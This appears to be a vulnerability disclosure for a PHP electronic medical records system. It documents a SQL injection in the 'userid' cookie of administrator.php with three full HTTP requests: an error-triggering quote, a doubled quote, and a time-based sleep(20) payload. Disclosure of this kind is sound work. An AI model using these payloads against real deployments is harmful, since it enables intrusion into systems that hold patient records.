# Electronic Medical Records System v1.0 by Patrick Mvuma has SQL injection

BUG_Author: lcg22266

User Login Credential: test@clinic.com/1234554321

vendors:https://www.sourcecodester.com/php/13475/electronic-medical-records-system-emr.html

Vulnerability File: /clinic/administrator.php

Vulnerability location: Cookie parameter 'userid'

Payload1:Cookie: userid=1234554321'; useremail=test%40clinic.com; login=18-02-2023%2010%3A35%3A34%20AM; user=6; PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm

```
GET /clinic/administrator.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: userid=1234554321'; useremail=test%40clinic.com; login=18-02-2023%2010%3A35%3A34%20AM; user=6; PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
Connection: close
```

sql statement error

Payload2:Cookie: userid=1234554321''; useremail=test%40clinic.com; login=18-02-2023%2010%3A35%3A34%20AM; user=6; PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm

```
GET /clinic/administrator.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: userid=1234554321''; useremail=test%40clinic.com; login=18-02-2023%2010%3A35%3A34%20AM; user=6; PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
Connection: close
```

correct page

Payload3:Cookie: userid=1234554321'%2b(select*from(select(sleep(20)))a)%2b'; useremail=test%40clinic.com; login=18-02-2023%2010%3A35%3A34%20AM; user=6; PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm

```
GET /clinic/administrator.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: userid=1234554321'%2b(select*from(select(sleep(20)))a)%2b'; useremail=test%40clinic.com; login=18-02-2023%2010%3A35%3A34%20AM; user=6; PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
Connection: close
```

The server response time is 20 seconds


